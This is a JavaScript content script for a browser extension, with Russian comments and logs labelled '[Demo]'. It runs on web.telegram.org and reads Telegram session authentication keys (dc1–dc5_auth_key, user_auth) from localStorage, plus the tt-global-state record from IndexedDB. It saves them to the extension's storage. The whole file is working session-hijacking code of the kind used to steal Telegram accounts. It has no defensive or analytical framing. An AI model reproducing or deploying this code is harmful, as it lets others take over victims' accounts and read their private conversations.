// content.js — выполняется на web.telegram.org (WebK и WebZ)
// WebK: читает localStorage (dc*_auth_key)
// WebZ: читает IndexedDB (tt-data → store → tt-global-state)

(async function collectTelegramAuth() {
  const result = { version: null, keys: {}, webzState: null };

  // --- 1. Пробуем WebK (localStorage) ---
  const targetKeys = [
    'dc1_auth_key', 'dc2_auth_key', 'dc3_auth_key',
    'dc4_auth_key', 'dc5_auth_key', 'user_auth'
  ];
  const localFound = {};
  targetKeys.forEach(key => {
    try {
      const val = localStorage.getItem(key);
      if (val !== null) localFound[key] = val;
    } catch (e) { /* ignore */ }
  });

  if (Object.keys(localFound).length > 0) {
    result.version = 'WebK';
    result.keys = localFound;
    console.log('[Demo] WebK: найдены ключи localStorage:', Object.keys(localFound));
  }

  // --- 2. Пробуем WebZ (IndexedDB) ---
  try {
    const webzData = await readWebZIndexedDB();
    if (webzData) {
      result.version = result.version || 'WebZ';
      result.webzState = webzData;
      console.log('[Demo] WebZ: прочитан tt-global-state из IndexedDB');
    }
  } catch (e) {
    console.warn('[Demo] WebZ IndexedDB ошибка:', e);
  }

  // --- 3. Сохраняем результат в chrome.storage.local ---
  if (result.version) {
    chrome.storage.local.set({ telegramAuth: result }, () => {
      console.log('[Demo] Сохранено:', result.version, 'ключей:', Object.keys(result.keys).length);
    });
  } else {
    chrome.storage.local.set({ telegramAuth: null }, () => {
      console.log('[Demo] Сессия Telegram не найдена.');
    });
  }
})();

// Функция чтения IndexedDB для WebZ
function readWebZIndexedDB() {
  return new Promise((resolve) => {
    const req = indexedDB.open('tt-data');
    req.onerror = () => resolve(null);
    req.onsuccess = (event) => {
      const db = event.target.result;
      if (!db.objectStoreNames.contains('store')) {
        db.close();
        resolve(null);
        return;
      }
      const tx = db.transaction('store', 'readonly');
      const store = tx.objectStore('store');
      const getReq = store.get('tt-global-state');
      getReq.onsuccess = () => {
        db.close();
        resolve(getReq.result || null);
      };
      getReq.onerror = () => {
        db.close();
        resolve(null);
      };
    };
    setTimeout(() => resolve(null), 2000);
  });
}